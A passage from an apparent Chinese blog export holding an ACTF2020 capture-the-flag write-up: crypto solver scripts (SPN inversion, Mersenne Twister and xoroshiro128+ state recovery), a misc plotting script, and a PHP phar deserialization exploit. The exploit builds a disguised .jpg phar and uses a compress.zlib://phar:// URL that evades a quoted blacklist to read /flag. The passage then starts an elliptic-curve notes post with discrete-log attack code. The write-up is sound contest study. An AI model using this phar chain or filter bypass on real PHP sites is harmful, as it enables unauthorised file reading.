class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">io = remote(<span class="string">"actf.node.csuaurora.org"</span>, <span class="string">"28627"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"[:20]="</span>)</span><br><span class="line">    prefix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pre = sha512(long_to_bytes(n)).hexdigest()[:<span class="number">20</span>]</span><br><span class="line">        <span class="keyword">if</span> pre == prefix:</span><br><span class="line">            io.sendline(str(n))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexpad</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    numZeros = <span class="number">8</span> - len(hexBlock)</span><br><span class="line">    <span class="keyword">return</span> numZeros * <span class="string">"0"</span> + hexBlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_substitute</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    substitutedHexBlock = <span class="string">""</span></span><br><span class="line">    substitution = [<span class="number">8</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> hexDigit <span class="keyword">in</span> hexBlock:</span><br><span class="line">        newDigit = substitution.index(int(hexDigit, <span class="number">16</span>))</span><br><span class="line">        substitutedHexBlock += hex(newDigit)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> substitutedHexBlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permute</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    inv_permutation = [<span class="number">22</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">29</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">17</span>,</span><br><span class="line">                      <span class="number">28</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">21</span>, <span class="number">30</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">23</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">10</span>]</span><br><span class="line">    block = int(hexBlock, <span class="number">16</span>)</span><br><span class="line">    permutedBlock = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        bit = (block &amp; (<span class="number">1</span> &lt;&lt; i)) &gt;&gt; i</span><br><span class="line">        permutedBlock |= bit &lt;&lt; inv_permutation[i]</span><br><span class="line">    <span class="keyword">return</span> hexpad(hex(permutedBlock)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_round</span><span class="params">(hexMessage)</span>:</span></span><br><span class="line">    numBlocks = len(hexMessage) // <span class="number">8</span></span><br><span class="line">    permutedHexMessage = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numBlocks):</span><br><span class="line">        permutedHexMessage += inv_permute(hexMessage[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line">    substitutedHexMessage = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numBlocks):</span><br><span class="line">        substitutedHexMessage += inv_substitute(permutedHexMessage[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line">    <span class="keyword">return</span> substitutedHexMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(hexMessage)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        hexMessage = dec_round(hexMessage)</span><br><span class="line">    <span class="keyword">return</span> unhexlify(hexMessage.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    hexMessage = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(decrypt(hexMessage))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="tiny-PRNG0"><a href="#tiny-PRNG0" class="headerlink" title="tiny_PRNG0"></a>tiny_PRNG0</h3><h4 id="题解分析-7"><a href="#题解分析-7" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>MT predict，也是经典考点了，题目能得到无限长的随机数流，取624个即可.</p><p>可以用自己写的脚本<a href="https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#mt---predictbacktrace" target="_blank" rel="noopener">https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#mt—-predictbacktrace</a>，也可以用randcrack.</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">Rand = RandCrack()</span><br><span class="line">data = [...]</span><br><span class="line"><span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">    Rand.submit(data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(data)):</span><br><span class="line">    Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="keyword">print</span> Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br></pre></td></tr></table></figure><p>预测成功一次即获得flag.</p><h3 id="tiny-PRNG1"><a href="#tiny-PRNG1" class="headerlink" title="tiny_PRNG1"></a>tiny_PRNG1</h3><h4 id="题解分析-8"><a href="#题解分析-8" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> s[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint64_t</span> <span class="title">rotl</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint64_t</span> x, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x &lt;&lt; k) | (x &gt;&gt; (<span class="number">64</span> - k));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">next</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> s0 = s[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">uint64_t</span> s1 = s[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> result = s0 + s1;</span><br><span class="line"></span><br><span class="line">  s1 ^= s0;</span><br><span class="line">  s[<span class="number">0</span>] = rotl(s0, <span class="number">55</span>) ^ s1 ^ (s1 &lt;&lt; <span class="number">14</span>);</span><br><span class="line">  s[<span class="number">1</span>] = rotl(s1, <span class="number">36</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">s[<span class="number">0</span>] = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint64_t</span> *&gt;(flag + <span class="number">5</span>);</span><br><span class="line">s[<span class="number">1</span>] = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint64_t</span> *&gt;(flag + <span class="number">13</span>);</span><br><span class="line">assert((<span class="string">"Flag length correct"</span>, <span class="built_in">strlen</span>(flag) == <span class="number">22</span>));</span><br></pre></td></tr></table></figure><p>next的re很简单，但输出只是s0+s1，推了挺长一段时间觉得挺麻烦的，就尝试用z3直接求解，前连续两个res即可确定种子.</p><p>拿到flag以后发现是xoroshiro128plus- -</p><h4 id="exp-8"><a href="#exp-8" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mask = <span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotl</span><span class="params">(x, k)</span>:</span></span><br><span class="line"><span class="keyword">return</span> ((x &lt;&lt; k) | (x &gt;&gt; (<span class="number">64</span> - k))) &amp; mask</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(s0, s1)</span>:</span></span><br><span class="line">s1 ^= s0</span><br><span class="line"><span class="keyword">return</span> (rotl(s0, <span class="number">55</span>) ^ s1 ^ (s1 &lt;&lt; <span class="number">14</span>)) &amp; mask, rotl(s1, <span class="number">36</span>)</span><br><span class="line"></span><br><span class="line">fl, fr = BitVecs(<span class="string">'fl fr'</span>, <span class="number">64</span>)</span><br><span class="line">s0, s1 = fl, fr</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> argv[<span class="number">1</span>:]:</span><br><span class="line">solver.add((s0 + s1) &amp; mask == int(res, <span class="number">0</span>))</span><br><span class="line">s0, s1 = next(s0, s1)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> solver.check() != sat:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">flag = solver.model()</span><br><span class="line">flag_left, flag_right = flag[fl].as_long(), flag[fr].as_long()</span><br><span class="line">print(<span class="string">"[&#123;&#125;] - &#123;&#125; | &#123;&#125;"</span>.format(cnt, long_to_bytes(flag_left), long_to_bytes(flag_right)))</span><br><span class="line">solver.add(And(fl != flag[fl], fr != flag[fr]))</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># [1] - b'rihsorox' | b'sulp821o'</span></span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>公众号回复</p><h3 id="神奇的时钟"><a href="#神奇的时钟" class="headerlink" title="神奇的时钟"></a>神奇的时钟</h3><h4 id="题解分析-9"><a href="#题解分析-9" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>hint给了新加坡樟宜机场，查了下时钟墙就知道怎么回事了- -</p><p>csv文件中给出的均为总秒数，用matplotlib绘图即可</p><p><img src= "/img/loading.gif" data-src="/2020/06/06/WriteUp-ACTF2020/image-20200604195637685.png" alt></p><h4 id="exp-9"><a href="#exp-9" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.lines <span class="keyword">import</span> Line2D</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = [[...],[...],...]</span><br><span class="line"><span class="comment"># (min, sec)</span></span><br><span class="line">params = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> data:</span><br><span class="line">    param = []</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        param.append(((col % <span class="number">3600</span>) // <span class="number">60</span>, col % <span class="number">60</span>))</span><br><span class="line">    params.append(param)</span><br><span class="line"><span class="comment"># (delta_x, delta_y)</span></span><br><span class="line">delta = &#123;<span class="number">0</span>: (<span class="number">0</span>, <span class="number">0.5</span>), <span class="number">7</span>: (<span class="number">0.353</span>, <span class="number">0.354</span>), <span class="number">10</span>: (<span class="number">0.433</span>, <span class="number">0.25</span>), <span class="number">15</span>: (<span class="number">0.5</span>, <span class="number">0</span>), <span class="number">20</span>: (<span class="number">0.433</span>, <span class="number">-0.25</span>), <span class="number">23</span>: (<span class="number">0.353</span>, <span class="number">-0.354</span>), <span class="number">30</span>: (<span class="number">0</span>, <span class="number">-0.5</span>), <span class="number">37</span>: (<span class="number">-0.353</span>, <span class="number">-0.354</span>), <span class="number">40</span>: (<span class="number">-0.433</span>, <span class="number">-0.25</span>), <span class="number">45</span>: (<span class="number">-0.5</span>, <span class="number">0</span>), <span class="number">50</span>: (<span class="number">-0.433</span>, <span class="number">0.25</span>), <span class="number">53</span>: (<span class="number">-0.353</span>, <span class="number">0.354</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># draw</span></span><br><span class="line">figure, ax = plt.subplots()</span><br><span class="line">ax.set_xlim(left=<span class="number">0</span>, right=<span class="number">115</span>)</span><br><span class="line">ax.set_ylim(bottom=<span class="number">0</span>, top=<span class="number">15</span>)</span><br><span class="line">y = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> params:</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        dx, dy = delta[col[<span class="number">0</span>]]</span><br><span class="line">        ax.add_line(Line2D((x, x + dx), (y, y + dy), linewidth=<span class="number">1</span>, color=<span class="string">'blue'</span>))</span><br><span class="line">        dx, dy = delta[col[<span class="number">1</span>]]</span><br><span class="line">        ax.add_line(Line2D((x, x + dx), (y, y + dy), linewidth=<span class="number">1</span>, color=<span class="string">'red'</span>))</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    y -= <span class="number">1</span></span><br><span class="line">plt.plot()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><h4 id="题解分析-10"><a href="#题解分析-10" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>退坑web手的心酸操作（x</p><p>考察phar反序列化，<code>highlight_file</code>和<code>file_exists</code>都能触发，但有做<code>strtolower(substr($file,0,4))==&#39;phar&#39; || strtolower(substr($high_light,0,4))==&#39;phar&#39;</code>的黑名单判断，因此用zlib绕过.</p><p>poc链：<code>__destruct(Sh0w) =&gt; __call(S6ow) =&gt; __get(S6ow) =&gt; file_get(S6ow) =&gt; __toString(Show)</code>.</p><p>实现任意文件读取（存在以下黑名单<code>preg_match(&quot;/http|https|file:|gopher|dict|zip|php|\.\./i&quot;, $this-&gt;source)</code>），但读取flag只需<code>file_get_contents(&quot;/flag&quot;)</code>即可.</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file, $params)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = $params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$params = <span class="keyword">array</span>();</span><br><span class="line">$params[<span class="string">"_show"</span>] = <span class="string">"file_get"</span>;</span><br><span class="line">$file = <span class="keyword">new</span> Show(<span class="string">"/flag"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> Sh0w(<span class="keyword">new</span> S6ow($file, $params));</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"SimplePHP.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"SimplePHP.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将SimplePHP.phar后缀名修改为.jpg上传，再包含即可.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//actf.node.csuaurora.org:28726/file.php?high_light=compress.zlib://phar://upload/9ee4f116e740e2207acbdfc5a78c12cd.jpg&amp;file=upload/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Aurora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learning of Elliptic Curve</title>
      <link href="/2020/05/11/Learning-of-Elliptic-Curve/"/>
      <url>/2020/05/11/Learning-of-Elliptic-Curve/</url>
      
        <content type="html"><![CDATA[<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>椭圆曲线密码相关咕了挺久了ojz，也没系统做过总结，谨以此文作为学习记录，以便日后翻阅</p><p>ps: 各种实验ddl期间- -不定期更新(🕊)</p><h2 id="Basis"><a href="#Basis" class="headerlink" title="Basis"></a>Basis</h2><h3 id="1-1-Elliptic-Curve-in-Finite-Field"><a href="#1-1-Elliptic-Curve-in-Finite-Field" class="headerlink" title="1.1    Elliptic Curve in Finite Field"></a>1.1    Elliptic Curve in Finite Field</h3><p>设p为一素数，n为正整数，$q=p^{n}$，则$F_{q}$上的Weierstrass方程式</p><script type="math/tex; mode=display">y^{2}+a_{1}xy+a_{3}y=x^{3}+a_{2}x^{2}+a_{4}x+a_{6},\quad a_{i}\in F_{q}</script><p>决定的曲线再添加上无穷远点后，即得到射影平面$P^{2}(\bar{F_{q}})$上的一条曲线E，若非奇异，则称其为一条椭圆曲线，当且仅当$\Delta\neq 0$.</p><p>给定一条$F_{q}$上的椭圆曲线E，及其上任意两点P和Q，连接P和Q的直线与E交于第三个点R，由R和无穷远点O可决定一直线，该直线与E的第三个交点定义为P和Q的和，记作$P\oplus Q$. 且易证得该加法定义下满足阿贝尔群.</p><p>给出具体的加法公式如下：</p><p>设$P_{1}+P_{2}=P_{3},\quad P_{i}=(x_{i},y_{i})\in E.$</p><p>(a) 若$x_{1}=x_{2},y_{1}+y_{2}+a_{1}x_{1}+a_{3}$，则$P_{1}+P_{2}=O$，否则</p><p>(b) 一般性如图所示：</p><p><img src= "/img/loading.gif" data-src="/2020/05/11/Learning-of-Elliptic-Curve/QQ图片20200511171504.jpg" alt></p><p>但要注意的是，<strong>在$F_{q}$上，该直线PQ不同于实数域</strong>，可表示为</p><script type="math/tex; mode=display">ax+by+c\equiv 0(mod\ q)</script><p>另外，可以证明，$p\neq 2,3$时，每一条$F_{q}$上的椭圆曲线都同构于</p><script type="math/tex; mode=display">E:y^{2}=x^{3}+ax+b,\quad a,b\in F_{q}</script><p>[Hasse定理] - 如果$E_{p}(a,b):y^{2}=x^{3}+ax+b\ (4a^{3}+27b^{2}\neq 0)$是定义在$F_{p}$上的椭圆曲线，则有</p><script type="math/tex; mode=display">|\#E-(p+1)|\leq 2\sqrt{p}</script><p>注：特别的，在$p\equiv 3(mod\ 4)$时，</p><script type="math/tex; mode=display">\#E_{p}(a,0)=p+1.</script><p>在ECC等体制中寻找基点的算法：</p><ul><li>计算椭圆曲线E的阶 N(#E).</li><li>选择一子群的阶n（n为素数），辅因子$h=\frac{N}{n}$.</li><li>在E上选择一随机点P，如果G=hp为0，则重新选取P，此时G即为基点（阶为n）.</li></ul><h2 id="Attacking-the-Discrete-Logarithm-Problem"><a href="#Attacking-the-Discrete-Logarithm-Problem" class="headerlink" title="Attacking the Discrete Logarithm Problem"></a>Attacking the Discrete Logarithm Problem</h2><p>在进入ECDLP前，我们首先介绍DLP及各种可用的攻击方法（没跑题- -拍打.jpg）：</p><h3 id="2-1-Baby-Step-Giant-Step-Algorithm"><a href="#2-1-Baby-Step-Giant-Step-Algorithm" class="headerlink" title="2.1    Baby-Step, Giant-Step Algorithm"></a>2.1    Baby-Step, Giant-Step Algorithm</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="[Theorem]"></a>[Theorem]</h4><p>北上广深算法- -算法优化思路可看作中间相遇，复杂度$O(\sqrt{n})$.</p><p>假设$\alpha^{x}=\beta$，G是n阶循环群，令$m=\lceil \sqrt{n}\rceil$. 则可以将x表示为$im+j(0\leq i,j\leq m)$. 有</p><script type="math/tex; mode=display">\beta=\alpha^{x}=\alpha^{im+j}=\alpha^{im}\alpha^{j}\\\beta(\alpha^{-m})^{i}=\alpha^{j}</script><p>先遍历$j\in [0,m]$，存储对应的所有$\alpha^{j}$. 再去遍历$i\in [0,m]$，找到碰撞即可.</p><h4 id="Code"><a href="#Code" class="headerlink" title="[Code]"></a>[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = ceil(sqrt(p - <span class="number">1</span>))</span><br><span class="line">    S = &#123;pow(alpha, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = pow(alpha, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="2-2-Pollard’s-ρ-Method"><a href="#2-2-Pollard’s-ρ-Method" class="headerlink" title="2.2     Pollard’s ρ-Method"></a>2.2     Pollard’s ρ-Method</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="[Theorem]"></a>[Theorem]</h4><p>和大数分解的Pollard’s ρ有类似之处（生日悖论）</p><p>假设$\alpha^{x}=\beta$，G是n阶循环群，将其划分为<code>psize</code>个等价类，$S_{1},S_{2},…,S_{psize}$. 接着再定义G上的序列$\{x_i\}$，每个$x_{i}$均能表示作$\alpha^{a_{i}}\beta^{b_{i}}$.</p><p>并生成mod 